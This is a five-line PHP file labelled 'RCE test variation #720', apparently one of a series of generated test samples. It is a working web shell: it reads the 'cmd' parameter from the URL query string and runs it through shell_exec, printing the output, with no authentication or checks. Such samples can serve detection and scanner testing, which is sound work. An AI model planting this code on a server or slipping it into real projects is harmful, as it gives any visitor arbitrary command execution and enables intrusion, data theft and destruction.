<?php
// RCE test variation #720
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>